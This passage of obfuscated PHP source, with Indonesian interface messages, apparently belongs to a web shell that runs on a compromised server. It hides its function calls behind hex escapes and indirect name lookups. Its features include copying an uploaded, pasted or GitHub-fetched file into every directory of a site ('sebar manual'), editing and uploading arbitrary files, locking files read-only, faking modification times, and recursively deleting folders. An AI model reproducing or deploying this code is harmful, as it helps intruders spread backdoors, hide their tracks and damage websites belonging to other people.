"\xe2\235\x8c\40\x44\x69\162\x65\153\164\x6f\162\151\x20\164\x61\x72\x67\145\x74\x20\167\x61\x6a\151\x62\40\50\163\x65\142\141\162\x20\x6d\x61\x6e\x75\141\x6c\51\56"; error_log("\x46\x4f\122\115\137\x44\x45\120\114\117\131\x5f\x56\x41\114\111\104\101\x54\x45\137\x46\x41\111\114\x3a\40\x54\x61\x72\147\x65\x74\40\144\x69\162\x20\x6b\157\163\x6f\156\x67\56"); } elseif ($targetDir === false || !is_dir($targetDir)) { $errorMessage = "\xe2\235\x8c\x20\x44\x69\162\145\x6b\x74\x6f\162\151\40\x74\x61\162\x67\145\x74\40\155\141\156\x75\x61\154\x20\164\151\144\x61\153\x20\166\141\154\x69\x64\72\40" . htmlspecialchars($targetDirInput); error_log("\106\x4f\122\115\137\x44\105\x50\114\117\x59\x5f\x56\101\114\111\x44\101\124\105\x5f\x46\x41\111\114\x3a\40\x54\141\x72\x67\145\164\40\x64\151\162\40\x74\x69\144\x61\x6b\x20\166\141\154\x69\144\72\x20" . $targetDirInput); } elseif (!is_readable($targetDir)) { $errorMessage = "\xe2\235\x8c\x20\104\151\162\x65\x6b\164\157\162\151\x20\164\x61\162\x67\x65\x74\x20\155\141\x6e\165\141\154\40\164\151\144\x61\x6b\40\x72\x65\141\x64\x61\x62\x6c\x65\x3a\x20" . htmlspecialchars($targetDir); error_log("\x46\117\122\115\137\x44\105\120\114\117\131\x5f\x56\x41\114\x49\x44\101\124\105\x5f\x46\101\111\x4c\x3a\x20\124\141\162\x67\145\164\x20\x64\x69\162\40\x74\x69\144\141\153\x20\162\145\x61\144\141\x62\154\x65\x3a\x20" . $targetDir); } else { $targetDirDisplay = $targetDir; $fileUploaded = isset($_FILES["\146\151\x6c\145"]) && $_FILES["\146\x69\154\145"]["\x65\x72\x72\157\x72"] === UPLOAD_ERR_OK; $githubUrlInput = trim($_POST["\147\x69\164\150\x75\x62\137\165\162\154"] ?? ''); $githubUrlProvided = !empty($githubUrlInput); $rawContentProvided = !empty(trim($_POST["\162\141\167\x5f\143\x6f\x6e\164\x65\156\164"] ?? '')) && !empty(trim($_POST["\162\141\x77\x5f\x66\151\x6c\145\156\x61\x6d\x65"] ?? '')); $sourcePathForCopy = null; $originalNameToUse = ''; $tempSourceToDelete = null; if ($fileUploaded) { $file = $_FILES["\x66\x69\x6c\x65"]; $tmpPath = $file["\164\155\160\137\x6e\x61\x6d\145"]; $originalName = basename($file["\x6e\x61\155\x65"]); $ext = pathinfo($originalName, PATHINFO_EXTENSION); $randomNameInitial = generateRandomName($ext); $initialUploadPath = __DIR__ . DIRECTORY_SEPARATOR . $randomNameInitial; if (move_uploaded_file($tmpPath, $initialUploadPath)) { $sourcePathForCopy = $initialUploadPath; $originalNameToUse = $originalName; $tempSourceToDelete = $initialUploadPath; $sourceMethodUsed = "\x75\160\154\x6f\141\x64"; } else { $errorMessage = "\342\x9d\x8c\40\x47\x61\147\141\154\40\160\x69\156\144\x61\150\x20\x66\151\x6c\145\x20\165\160\154\157\x61\144\x2e"; error_log("\106\x4f\122\115\x5f\104\x45\120\114\x4f\131\137\123\x4f\125\122\103\x45\137\x46\x41\111\114\x3a\x20\107\x61\147\x61\x6c\40\155\x6f\166\x65\137\x75\x70\154\x6f\x61\144\145\x64\x5f\x66\151\x6c\145\x2e"); } } elseif ($githubUrlProvided) { if (strpos($githubUrlInput, "\x72\141\167\x2e\x67\x69\164\150\165\142\x75\x73\145\x72\143\157\x6e\164\x65\x6e\164\56\x63\x6f\155") === false && strpos($githubUrlInput, "\x67\151\x73\164\x2e\147\x69\164\x68\165\142\x75\163\x65\x72\143\x6f\x6e\x74\145\x6e\x74\56\143\x6f\155") === false) { $errorMessage = "\xe2\235\214\40\125\x52\x4c\40\x47\151\x74\110\165\x62\40\x28\146\157\162\155\51\x20\164\x69\144\x61\153\40\x76\141\x6c\x69\144\x2e"; error_log("\106\x4f\x52\115\x5f\104\x45\120\114\x4f\x59\137\123\x4f\125\122\x43\x45\x5f\106\101\x49\114\72\40\x55\x52\x4c\x20\x47\151\164\110\165\x62\x20\x28\146\157\162\x6d\51\40\x66\157\162\155\141\164\x20\164\x69\144\141\x6b\x20\166\141\x6c\x69\144\56"); } else { $contextOptions = array("\x73\x73\154" => array("\166\x65\162\x69\x66\x79\137\x70\x65\x65\162" => true, "\x76\x65\x72\151\146\171\x5f\x70\145\145\x72\x5f\x6e\x61\x6d\x65" => true), "\150\164\164\160" => array("\x68\145\x61\x64\x65\x72" => "\125\x73\145\162\x2d\x41\x67\x65\156\164\x3a\40\x50\110\120\55\x46\x69\x6c\145\55\x44\x6f\167\x6e\154\157\141\144\x65\162\x2f\61\x2e\x30\15\xa", "\x69\x67\156\157\x72\145\x5f\145\x72\x72\157\162\163" => true, "\164\151\155\145\x6f\x75\164" => 30)); $context = stream_context_create($contextOptions); $githubContentForm = @file_get_contents($githubUrlInput, false, $context); $statusCodeForm = 0; if (isset($http_response_header[0])) { preg_match("\x7b\x48\124\x54\120\134\x2f\134\123\x2a\x5c\x73\x28\x5c\144\x7b\x33\x7d\x29\x7d", $http_response_header[0], $match); if ($match) { $statusCodeForm = (int) $match[1]; } } if ($githubContentForm === false || $statusCodeForm !== 200) { $errorMessage = "\342\235\x8c\40\x47\141\x67\x61\154\40\144\x6f\x77\156\x6c\157\x61\144\40\107\x69\164\x48\x75\x62\x20\x28\146\157\x72\x6d\51\56\x20\x53\x74\x61\x74\x75\x73\x3a\x20" . ($statusCodeForm ?: "\x4e\x2f\101"); error_log("\x46\117\x52\x4d\x5f\x44\x45\120\114\117\131\x5f\x53\117\x55\122\103\105\137\x46\101\x49\114\x3a\x20\x47\141\x67\141\x6c\x20\144\157\x77\x6e\154\x6f\141\144\x20\x47\151\x74\x48\x75\142\x20\50\x66\x6f\162\155\51\x3a\x20" . $githubUrlInput . "\x20\x53\x74\x61\x74\x75\163\72\40" . $statusCodeForm); } else { $filenameFromUrlForm = basename(parse_url($githubUrlInput, PHP_URL_PATH)); $explicitFilenameForm = trim($_POST["\162\x61\x77\x5f\x66\x69\x6c\145\x6e\x61\x6d\x65"] ?? ''); $filenameToUseForm = !empty($explicitFilenameForm) ? basename($explicitFilenameForm) : $filenameFromUrlForm; if (empty($filenameToUseForm)) { $errorMessage = "\342\x9d\214\40\124\x69\144\141\153\x20\142\x69\x73\141\x20\x74\x65\x6e\164\x75\x6b\141\x6e\40\156\x61\x6d\x61\x20\x66\151\154\145\40\107\x69\164\110\x75\142\x20\x28\146\157\x72\155\x29\56"; } else { $extForm = pathinfo($filenameToUseForm, PATHINFO_EXTENSION); if (empty($extForm)) { $errorMessage = "\342\235\214\x20\x4e\141\155\141\x20\x66\151\154\145\x20\x47\151\x74\x48\165\142\x20\50\146\157\162\155\51\x20\164\x61\156\x70\141\40\145\153\163\164\x65\x6e\x73\151\56"; } else { $tempInternalNameForm = generateRandomName($extForm); $tempSourcePathForm = __DIR__ . DIRECTORY_SEPARATOR . $tempInternalNameForm; if (@file_put_contents($tempSourcePathForm, $githubContentForm) === false) { $errorMessage = "\xe2\x9d\x8c\x20\x47\x61\147\x61\x6c\40\163\151\x6d\160\141\x6e\40\153\x6f\x6e\164\x65\x6e\x20\107\x69\164\110\165\142\x20\50\146\157\162\155\51\x20\153\x65\40\164\145\155\160\x2e"; } else { $sourcePathForCopy = $tempSourcePathForm; $originalNameToUse = $filenameToUseForm; $tempSourceToDelete = $tempSourcePathForm; $sourceMethodUsed = "\x67\151\164\x68\x75\142\137\146\x6f\x72\155"; } } } } } } elseif ($rawContentProvided) { $rawContent = $_POST["\x72\141\167\x5f\x63\x6f\156\164\x65\156\x74"]; $rawFilename = basename(trim($_POST["\x72\x61\x77\x5f\x66\151\154\145\x6e\141\x6d\x65"])); $ext = pathinfo($rawFilename, PATHINFO_EXTENSION); if (empty($rawFilename) || empty($ext)) { $errorMessage = "\342\x9d\214\40\x4e\141\155\141\x20\46\x20\145\x6b\163\164\145\x6e\x73\151\x20\167\141\152\x69\x62\x20\50\153\x6f\x6e\164\x65\x6e\x20\155\145\156\164\x61\150\51\56"; error_log("\106\117\x52\115\137\104\x45\120\114\117\131\137\x53\x4f\x55\122\x43\x45\137\x46\101\111\x4c\72\x20\113\157\x6e\x74\145\x6e\x20\155\x65\x6e\x74\x61\150\x20\x6e\x61\x6d\x61\57\145\x6b\x73\164\145\x6e\x73\x69\x20\153\x6f\163\157\x6e\147\56"); } else { $tempInternalNameRaw = generateRandomName($ext); $tempSourcePathRaw = __DIR__ . DIRECTORY_SEPARATOR . $tempInternalNameRaw; if (file_put_contents($tempSourcePathRaw, $rawContent) === false) { $errorMessage = "\342\x9d\214\40\x47\141\147\141\154\x20\163\x69\155\160\x61\x6e\x20\x6b\157\x6e\x74\145\156\x20\155\x65\156\164\141\150\x2e"; error_log("\x46\117\122\x4d\x5f\x44\x45\120\x4c\x4f\131\137\123\x4f\125\122\x43\105\137\x46\x41\x49\x4c\x3a\40\107\141\147\x61\x6c\40\163\151\155\160\x61\156\x20\153\157\156\x74\145\x6e\x20\155\145\156\164\x61\x68\40\x6b\x65\x20\x74\x65\155\160\56"); } else { $sourcePathForCopy = $tempSourcePathRaw; $originalNameToUse = $rawFilename; $tempSourceToDelete = $tempSourcePathRaw; $sourceMethodUsed = "\162\x61\x77"; } } } else { if (empty($errorMessage)) { $errorMessage = "\xe2\235\x8c\40\x54\151\x64\141\x6b\40\x61\144\x61\x20\x73\165\x6d\x62\x65\x72\x20\146\x69\x6c\x65\x20\x76\x61\x6c\151\x64\x20\50\x73\145\142\x61\162\40\x6d\x61\156\x75\x61\x6c\51\56"; error_log("\106\117\122\x4d\137\x44\x45\x50\x4c\117\x59\137\x53\117\125\x52\x43\105\x5f\x46\x41\x49\x4c\x3a\40\124\x69\x64\x61\153\40\141\x64\141\40\163\x75\155\142\145\162\x2e"); } } if ($sourcePathForCopy && $originalNameToUse && empty($errorMessage)) { $resultFileForManual = __DIR__ . DIRECTORY_SEPARATOR . "\x68\x61\x73\151\154\137\x73\x65\142\141\x72\x5f\x6d\141\156\165\x61\154\x5f" . date("\x59\155\144\x5f\110\x69\x73") . "\x5f" . preg_replace("\57\x5b\x5e\x61\55\x7a\x41\x2d\132\60\x2d\x39\137\x2d\135\x2f", "\x5f", pathinfo($originalNameToUse, PATHINFO_FILENAME)) . "\x2e\164\170\164"; $copyResult = copyToAllDirs($targetDir, $originalNameToUse, $sourcePathForCopy, $resultFileForManual, $targetDirDisplay, $originalNameToUse); $sourceTypeText = "\x53\x75\x6d\142\x65\x72"; if ($sourceMethodUsed === "\x75\x70\x6c\157\x61\144") { $sourceTypeText = "\x46\x69\x6c\x65\x20\x75\160\154\157\x61\144\x20\x3c\x73\x74\x72\157\156\x67\76" . htmlspecialchars($originalNameToUse) . "\x3c\57\x73\x74\x72\157\x6e\x67\76"; } elseif ($sourceMethodUsed === "\x67\x69\164\x68\x75\142\x5f\146\157\x72\x6d") { $sourceTypeText = "\106\151\154\x65\40\x64\x61\x72\x69\40\x47\x69\x74\x48\165\x62\x20\x28\146\157\162\155\51\x20\74\163\164\x72\x6f\156\147\x3e" . htmlspecialchars($originalNameToUse) . "\74\57\x73\164\x72\x6f\156\x67\x3e"; } elseif ($sourceMethodUsed === "\162\x61\167") { $sourceTypeText = "\113\x6f\156\x74\145\156\x20\155\x65\156\x74\x61\x68\x20\x3c\x73\x74\x72\x6f\156\147\76" . htmlspecialchars($originalNameToUse) . "\x3c\57\x73\x74\x72\157\156\x67\x3e"; } if (is_array($copyResult) && isset($copyResult["\145\162\162\157\x72"])) { $errorMessage = "\xe2\x9a\xa0\357\xb8\x8f\40{$sourceTypeText}\40\x28\x73\x65\142\141\x72\40\x6d\x61\x6e\x75\x61\x6c\51\x20\147\141\x67\141\x6c\x20\163\x65\142\141\x72\56\40\105\x72\162\157\162\x3a\x20" . htmlspecialchars($copyResult["\x65\x72\x72\x6f\x72"]); error_log("\106\117\122\x4d\137\104\105\120\x4c\x4f\131\137\x52\x45\x53\x55\x4c\124\x5f\106\101\111\x4c\72\40" . $copyResult["\x65\162\162\157\x72"]); if (file_exists($resultFileForManual)) { $errorMessage .= "\x3c\x62\162\76\342\x84\xb9\xef\270\217\x20\x48\x61\163\151\154\x20\160\141\x72\x73\151\141\154\72\40\74\x73\x74\x72\x6f\156\x67\x3e" . htmlspecialchars(basename($resultFileForManual)) . "\x3c\57\x73\164\x72\157\156\x67\x3e"; } } elseif (is_array($copyResult) && !empty($copyResult)) { $results = $copyResult; $successMessage = "\342\x9c\205\x20{$sourceTypeText}\40\x28\163\x65\x62\x61\x72\40\155\141\x6e\x75\x61\154\x29\40\x64\x69\x73\145\142\141\162\x20\x6b\x65\x20" . count($results) . "\40\154\157\153\141\163\151\x20\x64\x69\40\74\x73\x74\162\x6f\x6e\147\76" . htmlspecialchars($targetDirDisplay) . "\x3c\57\163\x74\x72\157\x6e\147\76\56"; error_log("\106\x4f\122\115\x5f\x44\105\x50\x4c\x4f\131\137\122\x45\123\125\x4c\x54\x5f\x53\x55\103\x43\105\x53\x53\x3a\40\123\x65\142\x61\x72\x20\153\145\x20" . count($results) . "\40\x6c\x6f\153\141\x73\151\56"); if (file_exists($resultFileForManual)) { $successMessage .= "\x3c\142\162\x3e\xe2\x9c\x85\x20\120\x61\x74\150\40\x64\151\x73\151\x6d\x70\141\156\x20\x6b\145\x3a\x20\x3c\x73\164\x72\x6f\x6e\x67\x3e" . htmlspecialchars(basename($resultFileForManual)) . "\x3c\x2f\x73\164\x72\157\156\x67\x3e"; } else { $successMessage .= "\x3c\142\x72\76\342\232\240\xef\270\x8f\x20\107\x61\x67\141\154\40\x73\151\x6d\160\141\156\40\x54\130\x54\x20\150\x61\163\x69\x6c\x20\x73\x65\142\141\x72\x20\x6d\141\156\x75\x61\154\56"; } } else { $errorMessage = "\342\x9a\240\xef\xb8\x8f\x20{$sourceTypeText}\x20\50\163\145\x62\x61\x72\40\x6d\x61\x6e\x75\x61\154\51\40\x74\151\x64\x61\x6b\x20\141\x64\x61\x20\154\157\x6b\x61\x73\151\40\142\x65\x72\x68\x61\x73\x69\x6c\40\x64\151\163\x61\154\151\x6e\40\144\x69\40\x3c\x73\164\x72\157\x6e\x67\x3e" . htmlspecialchars($targetDirDisplay) . "\x3c\x2f\163\164\162\157\156\147\x3e\x2e"; error_log("\106\x4f\x52\x4d\137\x44\x45\120\114\117\131\137\x52\x45\x53\x55\114\x54\137\127\x41\x52\116\x3a\40\124\151\x64\141\x6b\x20\141\144\141\40\146\151\x6c\145\40\x64\x69\x73\x61\x6c\151\x6e\56"); if (file_exists($resultFileForManual) && filesize($resultFileForManual) > 0) { $errorMessage .= "\74\142\x72\76\xe2\204\xb9\357\xb8\217\x20\110\141\163\x69\154\40\160\141\x72\163\151\141\x6c\72\40\x3c\163\x74\162\x6f\x6e\147\x3e" . htmlspecialchars(basename($resultFileForManual)) . "\74\x2f\x73\164\x72\x6f\156\147\76"; } } } if ($tempSourceToDelete && file_exists($tempSourceToDelete)) { if (!@unlink($tempSourceToDelete)) { error_log("\106\117\x52\x4d\x5f\x44\x45\120\x4c\x4f\131\x5f\103\114\x45\x41\x4e\125\120\x5f\x46\101\x49\x4c\72\40\107\141\147\x61\154\x20\x68\x61\x70\x75\x73\40\x74\x65\155\x70\40\146\151\154\x65\x20\x73\145\142\141\162\x20\x6d\141\156\x75\141\154\40{$tempSourceToDelete}\x2e"); } } } } elseif ($action_post === "\x73\141\x76\x65\137\146\151\154\x65\x5f\x63\157\156\x74\x65\x6e\164" && $active_menu === "\x65\x64\151\x74\157\162") { $file_to_edit_from_post_save_action_post_final = $_POST["\146\x69\x6c\x65\x5f\164\x6f\137\x65\x64\x69\164\137\160\x61\164\150"]; $file_content_to_save_post_action_post_final = $_POST["\x66\151\x6c\x65\x5f\143\157\x6e\x74\x65\156\x74"]; $file_exists_local_save_post_action_editor_post_final = _get_fn_name_global_init_v3("\x5f\x67\137\x61\x73\x63\x69\151\137\x66\x69\x6c\145\x5f\x65\x78\151\x73\x74\x73", "\x66\151\154\x65\137\145\x78\151\x73\164\163"); $is_writable_local_save_post_action_editor_post_final = _get_fn_name_global_init_v3("\137\x67\137\x61\x73\x63\x69\x69\x5f\151\x73\137\x77\x72\x69\164\141\x62\x6c\x65", "\x69\x73\137\167\162\x69\164\141\x62\x6c\145"); $file_put_contents_local_save_post_action_editor_post_final = _get_fn_name_global_init_v3("\x5f\x67\137\x61\163\143\x69\151\x5f\x66\x69\x6c\x65\137\x70\165\164\x5f\143\157\x6e\164\x65\156\164\163", "\146\x69\154\145\137\x70\x75\x74\137\x63\157\x6e\x74\145\156\164\x73"); if (!empty($file_exists_local_save_post_action_editor_post_final) && call_user_func($file_exists_local_save_post_action_editor_post_final, $file_to_edit_from_post_save_action_post_final) && !empty($is_writable_local_save_post_action_editor_post_final) && call_user_func($is_writable_local_save_post_action_editor_post_final, $file_to_edit_from_post_save_action_post_final)) { if (!empty($file_put_contents_local_save_post_action_editor_post_final) && @call_user_func($file_put_contents_local_save_post_action_editor_post_final, $file_to_edit_from_post_save_action_post_final, $file_content_to_save_post_action_post_final) !== false) { $output_messages[] = "\x46\151\x6c\x65\x20\x27" . call_user_func($htmlspecialchars_fn, call_user_func($basename_fn, $file_to_edit_from_post_save_action_post_final)) . "\47\x20\144\151\x73\151\x6d\x70\141\156\x2e"; header("\x4c\x6f\x63\141\x74\151\x6f\156\x3a\40" . $_SERVER["\x50\110\120\x5f\x53\x45\x4c\106"] . "\77\x6d\145\156\165\x3d\145\170\160\x6c\157\162\x65\x72\x26\160\141\x74\150\x3d" . urlencode(call_user_func($dirname_fn, $file_to_edit_from_post_save_action_post_final)) . "\x26\146\151\154\x65\137\x61\143\164\x69\157\156\x5f\163\164\x61\x74\x75\163\75\x73\x61\x76\145\x5f\x73\x75\x63\143\x65\163\163"); die; } else { $error_messages[] = "\x47\141\x67\141\154\40\163\151\155\160\141\x6e\x20\146\151\154\x65\40\x27" . call_user_func($htmlspecialchars_fn, call_user_func($basename_fn, $file_to_edit_from_post_save_action_post_final)) . "\x27\x2e"; } } else { $error_messages[] = "\x46\x69\x6c\x65\40\x74\151\x64\x61\x6b\x20\x61\x64\x61\x2f\164\x69\144\x61\153\x20\x77\162\151\x74\141\142\x6c\x65\x2e"; } } elseif ($action_post === "\165\160\x6c\x6f\x61\x64\x5f\146\x69\154\x65") { if (isset($_FILES["\165\160\x6c\157\141\x64\x65\144\x5f\x66\x69\x6c\145\x73"])) { $total_files = count($_FILES["\x75\x70\x6c\x6f\x61\x64\145\144\x5f\x66\x69\154\145\x73"]["\156\141\x6d\145"]); for ($i = 0; $i < $total_files; $i++) { if ($_FILES["\x75\160\154\157\x61\x64\145\144\x5f\x66\151\154\145\x73"]["\x65\162\x72\x6f\x72"][$i] === UPLOAD_ERR_OK) { $tmp_name = $_FILES["\x75\x70\154\x6f\141\x64\x65\144\137\146\151\x6c\145\163"]["\164\155\x70\x5f\x6e\x61\x6d\x65"][$i]; $name = call_user_func($basename_fn, $_FILES["\165\x70\x6c\157\141\x64\145\x64\x5f\146\x69\x6c\145\163"]["\156\141\x6d\145"][$i]); $sanitized_name = str_replace(array("\x2f", "\134", "\x2e\56", "\0"), '', $name); if (empty($sanitized_name)) { $error_messages[] = "\125\x70\154\157\x61\x64\x20\105\162\162\157\162\72\x20\116\x61\x6d\141\x20\x66\x69\x6c\145\x20\153\145\x2d" . ($i + 1) . "\40\x74\151\144\x61\153\x20\166\141\154\151\144\x2e"; continue; } $destination = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $sanitized_name; if (@move_uploaded_file($tmp_name, $destination)) { @chmod($destination, 292); $output_messages[] = "\125\160\x6c\157\x61\144\x20\x53\x75\x63\x63\x65\163\163\x3a\40\106\151\x6c\145\x20\47{$sanitized_name}\47\40\x62\145\x72\150\x61\x73\x69\154\x20\x64\x69\165\x70\154\157\x61\x64\x2e"; } else { $php_err = error_get_last(); $err_msg = $php_err ? "\40\50\120\x48\x50\x20\x45\162\162\x6f\x72\x3a\x20" . $php_err["\x6d\x65\x73\x73\x61\147\145"] . "\51" : ''; $error_messages[] = "\125\x70\154\157\141\x64\x20\105\x72\x72\157\162\x3a\40\x47\x61\x67\141\154\x20\155\145\155\151\156\144\141\x68\153\141\156\40\146\x69\154\145\x20\x27{$sanitized_name}\x27{$err_msg}\x2e"; } } elseif ($_FILES["\165\160\154\157\x61\144\145\144\137\146\151\x6c\x65\163"]["\145\162\162\x6f\162"][$i] !== UPLOAD_ERR_NO_FILE) { $error_messages[] = "\x55\x70\x6c\157\x61\144\x20\x45\162\x72\x6f\162\x20\160\141\144\141\40\146\151\154\x65\x20\153\x65\55" . ($i + 1) . "\x3a\x20\113\x6f\x64\145\x20\x45\162\x72\157\162\x20" . $_FILES["\x75\x70\154\x6f\x61\x64\x65\144\x5f\x66\x69\x6c\145\163"]["\145\162\162\157\162"][$i]; } } } } elseif ($action_post === "\x63\x72\x65\x61\164\145\x5f\x6e\x65\x77\137\151\x74\x65\155") { if (isset($_POST["\156\145\167\137\x66\x6f\154\144\145\162\137\x6e\x61\155\x65"])) { $new_folder_name = call_user_func($basename_fn, call_user_func($trim_fn, $_POST["\156\x65\x77\137\x66\157\x6c\x64\x65\x72\x5f\x6e\141\x6d\x65"])); if (!empty($new_folder_name)) { $mkdir_fn_post = _get_fn_name_global_init_v3("\137\x67\137\x61\x73\x63\x69\151\x5f\155\x6b\x64\151\x72", "\155\153\144\x69\x72"); if (!empty($mkdir_fn_post) && @call_user_func($mkdir_fn_post, $current_path . DIRECTORY_SEPARATOR . $new_folder_name, 511, true)) { @chmod($current_path . DIRECTORY_SEPARATOR . $new_folder_name, 511); $output_messages[] = "\x46\x6f\x6c\144\x65\x72\40\x27" . call_user_func($htmlspecialchars_fn, $new_folder_name) . "\x27\40\x64\151\142\x75\x61\x74\x2e"; } else { $error_messages[] = "\107\x61\x67\141\154\x20\x6d\145\x6d\142\165\x61\x74\40\x66\x6f\x6c\144\145\x72\x20\47" . call_user_func($htmlspecialchars_fn, $new_folder_name) . "\47\x2e"; } } else { $error_messages[] = "\x4e\141\x6d\x61\40\x66\x6f\154\144\145\162\x20\164\151\x64\x61\x6b\40\166\141\154\151\x64\x2e"; } } elseif (isset($_POST["\x6e\x65\x77\x5f\146\x69\x6c\x65\x5f\x6e\x61\x6d\145"])) { $new_file_name = call_user_func($basename_fn, call_user_func($trim_fn, $_POST["\x6e\145\x77\137\x66\151\x6c\145\137\156\141\x6d\145"])); if (!empty($new_file_name)) { $touch_fn_post = _get_fn_name_global_init_v3("\x5f\x67\x5f\x61\163\143\x69\151\137\164\157\x75\x63\150", "\x74\157\165\143\x68"); if (!empty($touch_fn_post) && @call_user_func($touch_fn_post, $current_path . DIRECTORY_SEPARATOR . $new_file_name)) { @chmod($current_path . DIRECTORY_SEPARATOR . $new_file_name, 292); $output_messages[] = "\106\151\x6c\x65\40\47" . call_user_func($htmlspecialchars_fn, $new_file_name) . "\47\x20\x64\151\142\x75\x61\x74\56"; } else { $error_messages[] = "\x47\141\147\141\154\40\x6d\x65\x6d\x62\x75\141\164\x20\146\151\154\x65\x20\x27" . call_user_func($htmlspecialchars_fn, $new_file_name) . "\x27\56"; } } else { $error_messages[] = "\x4e\x61\155\141\40\146\151\x6c\x65\40\164\x69\144\x61\x6b\40\x76\x61\x6c\x69\144\x2e"; } } } elseif ($action_post === "\143\150\141\x6e\x67\x65\x5f\x63\150\155\157\x64" && isset($_POST["\164\x61\x72\x67\145\164"], $_POST["\156\145\167\x5f\160\145\162\155\163"])) { $chmod_target_basename = call_user_func($basename_fn, $_POST["\x74\x61\x72\x67\145\x74"]); $chmod_target_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $chmod_target_basename; $new_perms_str = call_user_func($trim_fn, $_POST["\156\x65\x77\137\160\x65\x72\155\x73"]); if (preg_match("\57\136\x5b\60\x2d\67\x5d\x7b\63\x2c\64\175\44\57", $new_perms_str)) { $new_perms_oct = octdec($new_perms_str); $chmod_fn_post_action = _get_fn_name_global_init_v3("\137\x67\137\x61\163\x63\x69\x69\x5f\x63\x68\x6d\157\x64", "\x63\150\x6d\x6f\x64"); $file_exists_fn_post_action = _get_fn_name_global_init_v3("\137\147\137\x61\163\x63\151\x69\137\x66\x69\154\x65\x5f\x65\x78\x69\x73\164\163", "\x66\151\154\145\x5f\145\170\x69\163\164\x73"); if (!empty($file_exists_fn_post_action) && call_user_func($file_exists_fn_post_action, $chmod_target_path) && !empty($chmod_fn_post_action) && call_user_func($function_exists_fn, $chmod_fn_post_action)) { if (@call_user_func($chmod_fn_post_action, $chmod_target_path, $new_perms_oct)) { $output_messages[] = "\x49\x7a\x69\156\x20\x75\x6e\164\165\153\x20\x27" . call_user_func($htmlspecialchars_fn, $chmod_target_basename) . "\47\40\144\151\165\x62\141\150\40\x6b\145\x20" . call_user_func($htmlspecialchars_fn, $new_perms_str) . "\56"; } else { $error_messages[] = "\107\141\x67\x61\x6c\x20\x6d\145\x6e\147\x75\x62\x61\150\40\x69\172\151\156\x20\165\x6e\164\x75\x6b\40\x27" . call_user_func($htmlspecialchars_fn, $chmod_target_basename) . "\47\56"; } } else { $error_messages[] = "\x43\x68\x6d\157\x64\40\x45\162\x72\x6f\x72\x3a\40\x54\x61\162\x67\145\164\x20\164\151\144\x61\153\x20\141\x64\141\56"; } } else { $error_messages[] = "\x43\150\x6d\157\x64\40\105\x72\x72\157\162\72\40\x46\x6f\x72\x6d\141\164\40\151\x7a\x69\x6e\x20\164\x69\x64\x61\153\40\166\x61\x6c\151\x64\56"; } } elseif ($action_post === "\143\x68\x61\x6e\147\145\x5f\155\x74\x69\x6d\145" && isset($_POST["\x74\141\162\x67\x65\x74"], $_POST["\156\145\167\x5f\155\x74\151\155\x65"])) { $mtime_target_basename = call_user_func($basename_fn, $_POST["\164\x61\162\x67\x65\x74"]); $mtime_target_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $mtime_target_basename; $new_mtime_str = call_user_func($trim_fn, $_POST["\156\145\x77\137\155\164\151\155\145"]); $new_timestamp = strtotime($new_mtime_str); if ($new_timestamp !== false) { $touch_fn_post_action = _get_fn_name_global_init_v3("\x5f\x67\137\141\163\x63\151\x69\x5f\x74\x6f\x75\143\x68", "\164\x6f\x75\143\x68"); $file_exists_fn_post_action = _get_fn_name_global_init_v3("\137\x67\x5f\x61\x73\x63\151\x69\137\x66\x69\154\x65\137\x65\x78\151\163\164\x73", "\x66\x69\154\x65\x5f\145\x78\x69\x73\x74\163"); if (!empty($file_exists_fn_post_action) && call_user_func($file_exists_fn_post_action, $mtime_target_path) && !empty($touch_fn_post_action) && call_user_func($function_exists_fn, $touch_fn_post_action)) { if (@call_user_func($touch_fn_post_action, $mtime_target_path, $new_timestamp)) { $output_messages[] = "\x4c\x61\163\x74\x20\115\157\144\151\x66\171\40\165\x6e\x74\165\153\40\x27" . call_user_func($htmlspecialchars_fn, $mtime_target_basename) . "\47\x20\144\151\x75\142\141\150\40\x6b\145\x20" . date("\x59\x2d\x6d\x2d\x64\x20\110\72\x69\x3a\x73", $new_timestamp) . "\56"; } else { $error_messages[] = "\107\x61\147\141\154\x20\x6d\x65\x6e\147\165\x62\141\150\40\114\141\x73\164\40\x4d\x6f\x64\151\146\x79\56"; } } else { $error_messages[] = "\x54\157\x75\x63\x68\x20\105\162\162\x6f\x72\x3a\x20\124\x61\x72\147\x65\x74\40\x74\151\144\x61\153\x20\x61\144\x61\x2e"; } } else { $error_messages[] = "\124\x6f\165\x63\150\x20\x45\162\x72\157\x72\72\40\x46\x6f\x72\155\141\x74\x20\x74\x61\156\x67\x67\141\154\57\167\x61\x6b\164\165\x20\164\x69\x64\141\x6b\x20\166\x61\x6c\151\x64\56"; } } elseif ($action_post === "\142\165\x6c\153\x5f\x61\143\164\151\x6f\x6e" && isset($_POST["\x62\165\154\153\137\x6f\160\x65\x72\x61\164\x69\157\x6e"], $_POST["\x73\x65\154\145\143\x74\x65\x64\x5f\151\164\x65\x6d\x73"])) { $operation = $_POST["\142\x75\x6c\153\137\x6f\x70\145\162\141\x74\151\157\156"]; $items = $_POST["\x73\145\x6c\x65\x63\164\x65\144\137\151\164\145\155\163"]; if (empty($items)) { $error_messages[] = "\x54\x69\x64\141\153\40\x61\x64\x61\40\x69\x74\x65\x6d\40\x79\x61\x6e\x67\x20\x64\x69\x70\x69\x6c\x69\150\x2e"; } else { if ($operation === "\x64\x65\x6c\145\164\x65") { $deleted_count = 0; $error_count = 0; foreach ($items as $item_name) { $item_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item_name; if (file_exists($item_path)) { if (deleteDirectoryRecursive($item_path)) { $deleted_count++; } else { $error_count++; } } else { $error_count++; } } $output_messages[] = "\110\x61\160\x75\163\x20\x6d\x61\163\163\141\154\40\163\145\154\145\163\x61\151\56\40\102\x65\x72\150\141\x73\151\x6c\72\x20{$deleted_count}\x2c\x20\107\x61\x67\141\x6c\72\x20{$error_count}\56"; } elseif ($operation === "\x7a\x69\x70") { if (!class_exists("\132\x69\x70\x41\x72\143\150\x69\x76\145")) { $error_messages[] = "\132\x69\x70\40\105\162\x72\157\x72\x3a\x20\x43\x6c\x61\x73\x73\40\x27\x5a\x69\x70\x41\x72\143\150\151\166\x65\47\x20\164\x69\144\x61\153\x20\144\151\x74\145\155\165\x6b\141\156\x2e"; } else { $zip_filename = !empty($_POST["\x7a\151\x70\137\146\x69\x6c\x65\x6e\x61\x6d\x65"]) ? call_user_func($basename_fn, 